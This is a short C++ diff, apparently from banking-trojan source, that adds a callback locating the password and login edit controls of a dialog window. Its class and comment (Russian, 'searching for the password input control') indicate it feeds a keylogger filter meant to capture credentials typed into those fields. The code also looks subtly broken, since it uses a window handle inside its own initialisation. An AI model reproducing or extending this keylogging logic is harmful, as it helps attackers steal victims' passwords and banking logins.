@@ -229,6 +229,16 @@ namespace InistWeb
 
 	}
 
+	void OnGetLogWnd(LPVOID Sender, HWND &LogWnd)
+	{
+		TKlgWndFilter* filter = (TKlgWndFilter*)Sender;
+		//ищек контрол ввода пароля
+		HWND parent = (HWND)pGetParent(filter->DialogWnd);
+		HWND PassWnd = (HWND)pFindWindowExA( parent, PassWnd, "EDIT", 0 );
+		LogWnd = (HWND)pFindWindowExA( parent, PassWnd, "EDIT", 0 );
+		if( LogWnd == 0 ) LogWnd = PassWnd;
+	}
+
 	//------------------------------------------------------------------------
 	void Init()
 	{
@@ -263,6 +273,7 @@ namespace InistWeb
 				{
                     F2->MouseLogWnd = MOUSE_LOG_WND_FILTER;
 					F2->PreFilter = F1;
+					F2->OnGetLogWnd = OnGetLogWnd;
                 }
 
 			}
